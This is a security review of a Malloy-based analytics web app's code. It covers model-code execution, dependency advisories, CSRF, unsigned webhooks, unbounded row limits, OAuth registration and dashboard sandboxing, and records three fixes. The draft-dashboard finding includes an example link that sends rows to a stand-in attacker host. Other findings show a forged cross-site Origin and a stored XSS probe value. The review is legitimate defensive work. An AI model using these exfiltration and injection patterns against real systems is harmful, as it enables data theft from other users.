# Security review — October 2026

**Scope.** The whole codebase at `main` (v0.2.73, commit `767a772`), from the
point of view of an OUTSIDE attacker: no account, a self-signed-up member
account, or a leaked credential. The question for every surface was whether such
a person can read or exfiltrate data they were not granted, run code on the
server, or take over another user's access. Insider misuse (admins, dataset
owners, repo owners) is out of scope and only mentioned where it defines the
trust boundary an outsider is trying to cross. The unmerged
`dashboard-screenshots` branch and the hosted sign-in integration (not installed
in this repository — `src/lib/hosted-auth-integration.ts` returns null) are out
of scope.

**Method.** Every file named under "Coverage" below was read in full. Findings
were then verified against a local dev server (ephemeral Postgres, seeded owner
and two members, two datasets — one private, one public — with real DuckDB
models) using curl and the MCP wire protocol, and against the engine directly
for the restricted-query gate. Where a finding is marked *verified*, the exact
request was sent and the response observed. The three code fixes in this branch
each carry a unit test and were re-verified live after the change.

**Headline.** No path was found by which an anonymous caller, a member, or the
holder of a member credential can read another tenant's rows, run SQL, or gain
another account's access through the application's own logic. The access-control
and query-governance design is sound and consistently applied. The material
exposure is at the edges: the trust placed in *model code* (which runs on the
server with DuckDB's external access on), a set of upstream dependency
advisories with real severity for this surface, and a handful of
defense-in-depth gaps, three of which are fixed here.

---

## Findings, most severe first

Severity reflects impact to an outside attacker given the current controls.
"Fixed" means a commit on this branch; "Recommendation" means a design or
product decision is needed first.

### H1 — Model code runs on the server with DuckDB external access on (recommendation)

**Where.** `src/lib/malloy.ts:94-109` (`makeConnection`) and
`src/lib/malloy.ts:326-338` (`fallbackConfigJson`): the DuckDB connection every
model without its own `malloy-config.json` gets is built with
`enableExternalAccess: true`, `setupSQL` pointing `home_directory`/`temp_directory`
at `/tmp`, and no `lockConfiguration`. Model text (`index.malloy` and friends)
may contain `duckdb.sql("""…""")` and `duckdb.table('path-or-url')` by design, and
compiling a model runs that SQL in the server process to resolve schemas.
`src/lib/roles.ts:118-132` records that the codebase knows this: it is why the
`MALLOYYO_DEVELOPER` role was removed and `canAuthor` is admin-only.

**Why it is in an outside-attacker review.** The *author* of model code is not
always an insider:

- An admin adds a GitHub repo they do not control (a community model, a vendor's
  repo). Whoever can push to that repo's configured branch — including through a
  merged pull request — now ships code the server will compile on the next
  webhook push (`src/lib/github-refresh.ts:89`, reached from the unauthenticated
  webhook routes) or refresh.
- A compromise of any GitHub account with push rights to a configured repo is
  immediately a compromise of every Malloyyo instance that pulls it.

With external access on, a `duckdb.sql` source can read any file the process can
(the environment, the deployment's secrets, the metadata database URL), reach
the network (httpfs, `ATTACH` to an internal Postgres/MySQL — an SSRF primitive
from inside the VPC), write files under `/tmp`, and autoload extensions. On
Vercel the blast radius is one function's environment; on the committed
Dockerfile it is the container.

**What is already right.** `check_repo` refuses pull requests from forks
(`src/lib/repo-authoring.ts:354`), so an unprivileged PR author cannot get their
branch compiled by an admin's check. Restricted mode keeps *query* text out of
this entirely (see Coverage). `malloy-config-local.json` in an archive is refused
(`src/lib/repo-publish.ts:354`).

**Recommendation.** `@malloydata/db-duckdb` 0.0.431 now ships a `securityPolicy`
option (`node_modules/@malloydata/db-duckdb/dist/duckdb_config.js:60-130`):
`"restricted"` forces `enableExternalAccess=false`, `lock_configuration=true`,
no `setupSQL`, no extension install/autoload, encrypted temp files, and
`"sandboxed"` adds `allowedDirectories`. Adopting it for the fallback connection
is the fix, but it is a product decision: it forbids `motherDuckToken` and
`setupSQL`, and it breaks every model that reads `https://` Parquet/CSV directly
(the babynames and auto-recalls reference repos do). Options, in order of
preference:

1. Default to `securityPolicy: "sandboxed"` with `allowedDirectories` limited to
   the revision's materialized workspace and `tempDirectory` set explicitly
   (replacing the `setupSQL`); allow an operator to opt a *repo* back into
   external access via an admin-only flag on `repos`, so the exposure becomes a
   deliberate per-repo decision rather than the default for every dataset.
2. Until then, document that adding a repo grants its committers code execution
   on the instance, pin repos to a commit SHA rather than a branch for repos the
   instance operator does not control, and require `GITHUB_WEBHOOK_SECRET` (M2).

### H2 — Dependency advisories with direct bearing on this surface (recommendation)

`npm audit --omit=dev` on the lockfile reports 59 advisories (7 critical, 35
high). Most are transitive and not reachable here (the BigQuery, Snowflake and
Trino client trees). These are the ones that matter:

| Package (installed) | Advisory | Fixed in | Relevance here |
| --- | --- | --- | --- |
| `next` 16.2.6 | GHSA-2464-fhr4-w9xw, GHSA-2xp9-vwfh-vxw4 (unauthenticated RCE in the Image Optimization API via SVG/AVIF), GHSA-673q-mjm6-r5xr (RCE in `use cache`), GHSA-6gpp-xcg3-4w24 (middleware/proxy bypass), plus SSRF and cache-confusion issues | 16.4.3 (semver-minor) | The app does not use `next/image`, Server Actions or `use cache`, which removes the direct trigger for the RCEs, but `/_next/image` is served by default and the proxy bypass would expose the page shells that rely on `proxy.ts` alone (see L5). |
| `next-auth` 5.0.0-beta.31 / `@auth/core` 0.41.2 | GHSA-8fpg-xm3f-6cx3 (configuration errors make `auth()` fail open with an error-populated object), GHSA-7rqj-j65f-68wh (email homoglyph normalization), GHSA-xmf8-cvqr-rfgj (`getToken()` throws on malformed Bearer) | later beta / 0.41.3 | `proxy.ts` and `getSessionUser` test `session?.user?.id`, so an error-shaped `auth()` result fails closed here; the email provider is not configured. Still the one dependency that *is* the auth boundary. |
| `@modelcontextprotocol/server` 2.0.0 | GHSA-jm63-cq47-j5jp (shared transport delivered one client's messages to another), GHSA-46jr-4wx8-v453 (memory exhaustion during validation within the size limit) | 2.3.0 | `src/app/mcp/route.ts:865` builds a fresh `McpServer` per request from a factory with `legacy: "stateless"`, which is the pattern the cross-client advisory says is safe — but the memory-exhaustion issue applies to any authenticated caller of `/mcp`. |
| `vega` 5.33.1 / `vega-functions` / `vega-expression` | GHSA-7f2v-3qq3-vvjf, GHSA-m9rg-mr6g-75gm (XSS through Vega expressions) | vega 6.4.0 (major) via `@malloydata/render` | Vega runs in the sandboxed dashboard frame (custom dashboards) and in the trusted page for tag-only dashboards. Specs come from repo-authored `#` render tags, so the attacker would already need H1's position. |

**Recommendation.** Bump `next` to 16.4.3 and the MCP server SDK to 2.3.x in
their own PR with a full preflight (both are minor bumps on paper, but Next is
the framework and AGENTS.md warns its conventions move). Take `next-auth` to
the current beta. Vega moves with the next `/malloy-update`. Add
`npm audit --omit=dev --audit-level=high` to `preflight.yml` so the next
advisory is seen when it lands rather than at the next review.

### M1 — Cross-site requests could write as a signed-in user (FIXED)

**Where.** Every state-changing route under `src/app/api/**` authenticates with
the Auth.js session cookie and reads `request.json()`, which does not check
`Content-Type`. Nothing checked `Origin` or `Sec-Fetch-Site`.

**Scenario (verified).** With a member's session cookie, a POST to
`/api/favorites` carrying `Origin: https://evil.example` and a `text/plain` body
was accepted (200, favourite toggled). In a browser the cookie's `SameSite=Lax`
default (`node_modules/@auth/core/lib/utils/cookie.js:52`) blocks the cookie on a
cross-*site* POST, so this was defense-in-depth rather than an open hole — but
Lax does not separate two origins on one registrable domain (a self-hoster's
sibling subdomain, which is exactly the Docker deployment story), and it is a
browser default the server was not enforcing.

**Fix.** `src/proxy.ts:81` now refuses a non-GET `/api/*` request that carries
a session cookie and no `Authorization` header when its `Origin` is not one of
this instance's own origins (APP_BASE_URL, the forwarded or plain Host) or when
`Sec-Fetch-Site: cross-site`; the decision is the pure function
`crossSiteWriteRefusal` in `src/lib/proxy-paths.ts:81` with tests in
`src/lib/proxy-paths.test.ts`. Bearer-authenticated calls (CLI, claude.ai),
cookieless calls (GitHub webhook delivery), requests with no `Origin`, and the
`/api/auth` and `/api/oauth` endpoints are untouched. Re-verified live: foreign
Origin → 403, same-origin → 200, bearer from `https://claude.ai` → 200, webhook →
200.

### M2 — GitHub webhooks are accepted unsigned when no secret is configured (recommendation)

**Where.** `src/lib/github-webhook.ts:28` returns `true` for any body when
`GITHUB_WEBHOOK_SECRET` is unset; `src/app/api/repos/[id]/webhook/github/route.ts:34`
and the dataset-scoped twin are public routes (no session), so the repo UUID in
the URL is the only secret.

**Scenario (verified).** An unauthenticated `POST /api/repos/<uuid>/webhook/github`
with an empty body returned 200 and, for a real repo, triggers
`refreshRepo` → a GitHub zipball download, a full compile of every dataset in the
repo, and a revision write. Anyone who learns a repo id (it appears in the
webhook URL an admin pastes into GitHub, in GitHub's delivery logs, and in the
admin API) can make the instance do that in a loop: a cheap way to exhaust the
instance's `GITHUB_TOKEN` rate budget, CPU, and database storage. Combined with
H1, it is also the trigger that pulls whatever is on the branch *now*.

**Recommendation.** Fail closed in production: when `GITHUB_WEBHOOK_SECRET` is
unset, answer 401 and log once at startup, with an explicit
`GITHUB_WEBHOOK_UNSIGNED=1` opt-out for an operator who accepts the trade. This
changes behaviour for every instance that configured a hook without a secret,
so it needs a release note; until then, set the secret on every hosted instance
(it is one env var plus the same value on the GitHub hook).

### M3 — Unbounded `maxRows` on the web run routes (FIXED)

**Where.** `src/app/api/run/route.ts` and `src/app/api/ask/route.ts` passed
`body.maxRows` straight through to DuckDB as the row limit (`rowLimit: maxRows`
in `runQueryForWeb`, `src/lib/mcp-tools.ts:500`).

**Scenario (verified).** A member's `POST /api/run` with `"maxRows": 1000000000`
was accepted; against a source over a large Parquet file that is a request to
materialize the whole thing into one function's memory, on an instance other
tenants share. `"maxRows": "abc"` was also accepted and produced
`rows.slice(0, NaN)` — an empty result labelled `truncated: true`.

**Fix.** `src/lib/row-limit.ts` clamps to `[1, 10000]` with a default of 1000,
matching the MCP `query` tool's own `max_rows` bound
(`packages/mcp-engine/src/surfaces/explore.ts`), and both routes use it
(`src/app/api/run/route.ts:26`, `src/app/api/ask/route.ts:130`). Tests in
`src/lib/row-limit.test.ts`.

### M4 — Draft dashboards let one member run code for every other reader of a dataset (recommendation)

**Where.** Any member with the `mcp` scope who can read a dataset may save a
draft dashboard with an arbitrary React component
(`src/lib/dashboards/draft.ts:116`). Drafts are listed to every reader of the
dataset (`src/lib/dashboards/meta.ts:302`) with the author's name, and open in
the same sandboxed iframe as a published dashboard.

**Scenario (verified).** Member A saved a draft on the public dataset; member B
could load its frame (`/api/dashboards/openshop/draft-…/frame` → 200), and the
frame's bridge ran restricted Malloy as **B** (`/api/dashboards/run` → 200 with
B's session). The sandbox holds — opaque origin, `connect-src 'none'`, nonce-only
scripts, image hosts allow-listed — so A's code cannot read B's cookie or call
the API directly. But the sandbox token list includes
`allow-popups-to-escape-sandbox`
(`src/app/datasets/[id]/dashboard/[name]/CustomDashboardFrame.tsx:124`,
`src/lib/dashboards/frame-html.ts:139`), so a component that renders
`<a href="https://attacker.example/?d=…" target="_blank">` opens a normal window
on the victim's first click with whatever the component chose to put in the URL
— including the rows the bridge just returned *as B*. On a dataset scoped by
`MALLOYYO_EMAIL`/`MALLOYYO_ROLES` (the multi-tenant pattern in
`src/lib/tenancy.ts`) those are rows A was never allowed to see. The same
component also renders in the MCP App panel, under the host's own sandbox.

**Recommendation.** Any one of: list a draft only to its author and admins until
it is promoted (the smallest change, and drafts are described as "work in
progress"); or drop `allow-popups-to-escape-sandbox` and route `# link` targets
through the parent's `navigate` bridge against an allow-list; or show a
"draft by <author> — runs as you" interstitial before first render. The row-scoped
case argues for the first.

### L1 — Deep health check is unauthenticated

`src/app/api/health/route.ts:22` runs `SELECT 1` for any caller. CLAUDE.md is
explicit that nothing on an interval may call this route because the hosted
Postgres scales to zero; an anonymous attacker can do exactly that from
outside, holding every tenant's database awake. Gate it behind a session or a
shared header, or move the dependency check behind `/api/healthz`'s process-local
answer plus an authenticated admin diagnostic.

### L2 — Unauthenticated OAuth dynamic client registration

`src/app/api/oauth/register/route.ts:28-70` creates an `oauth_clients` row for
any caller, with any `https://` redirect URI and an attacker-chosen `client_name`
(up to 100 characters, verified: `<img src=x onerror=…>` stored verbatim). React
escapes it on the consent screen and the redirect host is shown, so this is not
XSS; it is (a) unbounded row creation with no rate limit, and (b) consent
phishing — a client named "Claude" redirecting to the attacker's host, presented
to a signed-in user who clicks a link. Dynamic registration is required by the
MCP OAuth profile, so keep it, but: rate-limit per IP, prune clients that never
complete a grant after a day, and give the redirect host more weight than the
name on the consent screen.

### L3 — Error text reaches members verbatim

`/api/run` and the MCP `query` tool return the engine's error message. For a
model backed by a warehouse connector, a connection failure names the internal
host (`getaddrinfo ENOTFOUND pg.internal…`); DuckDB errors can include `/tmp`
paths. Compile errors are the product (an agent needs them), so this is
informational: keep the message, strip anything matching a URL or an absolute
path before it leaves the server.

### L4 — GitHub API URLs interpolate the branch unencoded in two helpers

`src/lib/github.ts` `fetchGitHubFile` and `listGitHubDir` build
`…/contents/${path}?ref=${branch}` without `encodeURIComponent` on `branch` or
`path`, while the zipball/tarball/tree helpers do encode. The host is fixed and
the inputs are admin-set, so there is no SSRF; a branch containing `&` just
sends GitHub an extra query parameter. Encode for consistency.

### L5 — Several pages rely on the proxy alone for authentication

`src/app/{chat,ltool,ltool/[slug],repos/[slug],datasets/new,datasets/[id]/config,datasets/[id]/questions}/page.tsx`
have no `getSessionUser` of their own. They are shells whose data arrives from
APIs that each authenticate, so a bypass of `proxy.ts` (see the Next advisory in
H2) exposes markup and the client bundle, not data. Worth knowing; not worth a
fix beyond upgrading Next.

### I1 — OAuth `resource` is recorded but not enforced

`src/app/api/oauth/authorize/route.ts:37` stores the RFC 8707 `resource`
parameter on the grant; `/mcp` does not compare it to its own URL. Tokens are
opaque, instance-scoped (`myo_<code>_…` for API tokens; OAuth tokens live in this
instance's database), so a token cannot be replayed at another instance anyway.
Enforce it when the MCP SDK upgrade (H2) lands, since the 2.3 SDK ships its own
audience check.

### I2 — PKCE verifier compared with `===`

`src/lib/oauth/codes.ts:49`. The code is consumed atomically before the
comparison (`src/app/api/oauth/token/route.ts:72`), so a timing oracle buys one
attempt per stolen code. Not exploitable; `timingSafeEqual` costs nothing.

### I3 — Refresh responses echoed a literal `scope: "mcp"` (FIXED)

`src/app/api/oauth/token/route.ts:99` now returns the grant's stored scope. No
authority changed hands either way — `grantedScopes` reads the stored string on
every request — but the CLI was being told it had lost `publish` on every
refresh.

### I4 — Role-granted readers are 404'd by two "read about" paths

`canReadDataset` (`src/lib/mcp-tools.ts:54`) and the dataset detail route
(`src/app/api/datasets/[id]/route.ts:43`) check owner/public/admin but not role
grants, while `visibleDatasetWhere` (what may be *run*) does. A member granted a
role on a private dataset can query it but gets "not found" from its detail
route, its share links and its Q&A list. Stricter than intended, so not a
security issue; a functional inconsistency to resolve one way or the other.

### I5 — Personal API tokens may never expire

`src/lib/api-tokens.ts:156` allows `expiresInDays: null`; the cap is 20 live
tokens per user (`:41`). A leaked never-expiring `publish` token is a standing
credential until someone notices the last-used column. Consider a default
expiry (90 days) with "never" as an explicit choice.

### I6 — No rate limiting anywhere

Sign-in, `/api/oauth/token`, `/api/oauth/register`, `/mcp`, `/api/run`, draft
saves and the webhooks have no per-IP or per-user throttle. Token entropy (256
bits, hashed) makes brute force irrelevant; the exposure is cost and
availability — every `/mcp` call can compile and run a query. Noted, not built:
this is infrastructure (an edge rule on Vercel, or a small token bucket keyed on
user id in the proxy).

---

## Coverage: what was checked and found sound

**Auth boundary.** `src/proxy.ts` denies every page to an anonymous visitor
except `/` and the sign-in screens, and lets `/api/*` authenticate itself —
verified: `/datasets/x`, `/ltool`, `/admin` → 307 to sign-in; `/mcp` → 401 with
`WWW-Authenticate` and `resource_metadata`. Every API route under `src/app/api/**`
was read; each either calls `getSessionUser()`/`requireAdmin()`,
`requireBearer()` with an explicit scope, or is deliberately public
(`/api/version`, `/api/healthz`, discovery, webhooks, `/api/telemetry/page`,
`/api/me` and `/api/datasets`/`/api/sources` in their anonymous-safe shapes).
Authorization is re-read from the `users` row on every request
(`src/lib/user.ts`, `src/lib/bearer-auth.ts:67`), so disabling a user takes
effect on the next request for sessions and tokens alike. Session cookies are
`HttpOnly; SameSite=Lax; Secure` on https. The sign-in `callbackUrl` guard
(`src/lib/callback-url.ts`) rejects protocol-relative and backslash forms
(tested); Auth.js's own redirect callback keeps `/api/auth/signin?callbackUrl=https://evil…`
on-origin (verified: no redirect off-site); `//evil.example/` is normalized by
Next to a local path. Admission defaults to `invite`; the first-sign-in owner
bootstrap only fires with no owner and no other active user
(`src/lib/admission.ts:43`); `MALLOYYO_ADMIN` can never be an admission default
(`src/lib/roles.ts:48`). Response headers: `X-Content-Type-Options`,
`X-Frame-Options: SAMEORIGIN`, `Referrer-Policy`, HSTS (verified).

**OAuth 2.0 server.** PKCE S256 is mandatory (`authorize/route.ts`); the
`redirect_uri` must exactly match a registered one and is validated before any
redirecting error; codes are 32 random bytes, SHA-256 hashed, 60-second,
consumed atomically (`UPDATE … WHERE consumed_at IS NULL RETURNING`) and then
checked for client and redirect match; refresh tokens rotate and a replay
revokes the whole grant family (`src/lib/oauth/tokens.ts:69`); access tokens are
24 h, refresh 90 d, both hashed at rest. The consent blob is HMAC-signed with a
timing-safe compare (`src/lib/oauth/authz-blob.ts:63`) and bound to the user who
started the flow (`decide/route.ts:31`), which closes consent CSRF. Scopes are
parsed strictly, unknown ones refused, and any grant with an unrecognized or
pre-scopes string reads as `mcp` only (`src/lib/api-token-scopes.ts`); the
protected-resource metadata advertises only `mcp`, so a claude.ai connection
cannot ask for `publish`. API tokens: `myo_<code>_<43 chars>` from 32 random
bytes, hashed, revocable per owner only, max 20 live per user. `grep` confirms
`validateAccessToken` is called only from `src/lib/bearer-auth.ts`.

**Scope enforcement (verified live with a member's tokens).** An `mcp`+`publish`
API token minted by a member: push to a dataset they do not own → 403; create a
dataset → 403; `/api/repos/push` to a new repo → 403; `status` on another's
dataset → 403. `issue_cli_token` from an API token → refused
(`src/app/mcp/route.ts:471`). Repo-authoring tools are registered only when
`REPO_AUTHORING=1`, the caller holds `MALLOYYO_ADMIN`, and the credential is
OAuth or carries `publish` (`src/app/mcp/route.ts:137`) — a member's tool list
contained none of them.

**MCP endpoint and cross-tenant access (verified).** Dataset resolution goes
through one predicate (`datasetVisibleWhere`: owner, public, role overlap, or
admin). As a member: `list_sources` showed only the public dataset; `query` and
`describe_source` against the private dataset by name and by UUID both answered
the same "unknown, or not visible to you" (`src/lib/mcp-host.ts:233`), so
existence cannot be probed; branch previews are admin-only; `save_draft_dashboard`
on the private dataset → "not found". Share slugs are instance-prefixed and a
slug from another `INSTANCE_CODE` is refused by name (verified); resolving a
slug requires sign-in and the dataset to be readable by the viewer, failing
closed when the dataset is gone (`/api/ltool/share` and `open_share_link` share
the gate, `src/lib/mcp-host.ts:332`). History and favourites list other users'
runs only on public datasets.

**Restricted query mode (verified against the engine).** Member-supplied Malloy
— `/api/run`, the MCP `query` tool, dashboard ad-hoc text, draft dashboard files
and their tile strings — compiles through `loadRestrictedQuery`
(`packages/mcp-engine/src/restricted.ts`, `src/lib/malloy.ts
runRestrictedMalloyFiles`). Probed and rejected with
`restricted-construct-forbidden`: `import`, `given:`, `duckdb.table(…)`,
`duckdb.sql(…)`, `##!` compiler flags, the `sql_*` function family, and raw SQL
function calls in both the typed `name!type(…)` and untyped `name!(…)` forms;
`join_one: … is duckdb.table(…)` inside an `extend` is also refused. Ordinary
Malloy over model-defined sources works. Dashboards decide the compiler by
provenance, not spelling (`src/lib/dashboards/run-plan.ts:63`): only a string the
stored manifest declares runs unrestricted. Tenant givens are supplied on the
Runtime and finalized in the config so a caller cannot override them, reserved
`MALLOYYO_*` names are stripped from every caller-supplied givens map, and a
query that references none of a dataset's required givens is refused
(`src/lib/tenancy.ts:174`, `packages/mcp-engine/src/host-givens.ts`,
`packages/mcp-engine/src/run.ts`).

**Dashboards (verified).** Custom dashboards render in an iframe with
`sandbox="allow-scripts allow-popups allow-popups-to-escape-sandbox"` — no
`allow-same-origin` — and the frame response carries its own CSP including the
`sandbox` directive, nonce-only `script-src`, `connect-src 'none'`,
`form-action 'none'`, `base-uri 'none'`, and an `img-src` widened only by
repo-declared hosts that are re-validated against a strict hostname grammar at
header-emission time (`src/lib/dashboards/image-hosts.ts:47`). Nothing from the
request is interpolated into the frame document (`FRAME_BOOTSTRAP`,
`src/lib/dashboards/frame-html.ts:80`); model-derived values go through
`safeJson`/HTML escaping (verified: a draft titled with `<b>…</b> &` arrived
escaped). The compiled bundle is served only with a 5-minute HMAC capability
token bound to viewer, dataset and dashboard (`frame-token.ts:20`,
`bundle/route.ts:19`) — verified: no token → 401, token for another dashboard →
401, anonymous frame → 401. Drafts are deletable only by their author or an
admin (verified 403 for another member). `public/dashboard-vendor.js` and
`mcp-app-sdk.js` are the only public static scripts and contain no secrets.
`react-markdown` renders chat output without `rehype-raw`; there is no
`dangerouslySetInnerHTML`, `eval`, or `new Function` in app code (the two
`innerHTML` uses in `src/lib/mcp-app-panel.ts` write constant strings and
`String(error)`). Vega charts run through `vega-interpreter` (no `Function`).

**GitHub model loading.** Hosts are fixed to `api.github.com`; `owner/repo` must
be exactly two non-empty segments (`parseGitHubRepo`); `GITHUB_TOKEN` is sent
only when the repo's flag says so and never appears in an error message (the
401 path reports GitHub's message, not the header). Archives are read from the
zip central directory with limits checked before inflation — 32 MB compressed,
8 MB per source file, 64 MB per data file, 128 MB total, 20 000 entries
(`src/lib/repo-archive.ts:36-66`) — and every member path passes
`isSafeMemberPath`. Branch previews fetch by the SHA the branch API returned,
not the commits API, so a fork's commit cannot pose as the repo's
(`src/lib/repo-preview-store.ts:49`); PR checks refuse forks. Public dataset
detail no longer serves the repo's files to anonymous callers (only `canManage`
gets `files`).

**Admin and API routes.** Every `src/app/api/admin/*` route calls
`requireAdmin()`; roster actions refuse owner changes and self-revocation
(`src/lib/roster.ts`); role names, dataset ids and given names are validated
against the catalog; `set-default` refuses `MALLOYYO_ADMIN`. `POST /api/datasets`
is admin-only (verified 403 for a member); dataset PATCH/DELETE, repo
GET/PATCH/DELETE (with a `?confirm=<slug>` guard), compile, refresh and fetch
are admin-only (verified). PATCH bodies are field-by-field, no mass assignment
onto the row. Token routes scope list/revoke to the session's user.

**Secrets and logging.** Env vars are read lazily through `src/lib/env.ts` and
never echoed: `/api/healthz` is status plus version with no I/O; `/api/health`
returns the driver's error string but never the URL; `GET /api/me` to an
anonymous caller returns instance name, tagline and provider *names* only.
`compileMalloy` logs the first 200 characters of a failing *model* source
(`src/lib/malloy.ts:129`) — admin content, and the logger emits JSON with no
header or cookie fields. The Dockerfile builds with dummy `DATABASE_URL` and
`MOTHERDUCK_TOKEN` values. MotherDuck's token travels only inside the DuckDB
config object. `missingEnv` names unset env *variables* only to a dataset's
owner on publish.

**Supply chain and configuration.** `vercel.json` is `framework` + `npm ci`
only; `next.config.ts` sets the four baseline headers and traces native DuckDB
per route; no `child_process` in the server (only the CLI, for `git`,
`claude` and a browser opener); `scripts/run-boot-migrations.ts` is the only
build-time script and reads `DATABASE_URL` from the build environment. The
advisories that matter are in H2.

**Resource exhaustion (noted, not built).** Query compile and execution are
per request with a pool of up to 5 DuckDB connections per model version and 16
versions warm (`src/lib/malloy.ts`); MCP results are byte-budgeted for the LLM
context; `max_rows` is capped at 10 000 on both surfaces now (M3). What is
missing is any per-caller throttle (I6) and a bound on draft dashboards per
user (each save compiles the model and bundles the component).

---

## Changes in this branch

| Commit | Finding | Files |
| --- | --- | --- |
| Bound the row limit on the web run routes | M3 | `src/lib/row-limit.ts` (+test), `src/app/api/run/route.ts`, `src/app/api/ask/route.ts` |
| Refuse cross-site cookie-authenticated API writes | M1 | `src/lib/proxy-paths.ts` (+test), `src/proxy.ts` |
| Echo the grant's real scope on an OAuth refresh | I3 | `src/lib/oauth/tokens.ts`, `src/app/api/oauth/token/route.ts` |

Everything else above is a recommendation that needs a product or deployment
decision: H1 (DuckDB security policy), H2 (dependency bumps), M2 (webhook secret
required), M4 (draft visibility / popup escape), L1, L2, I5, I6.
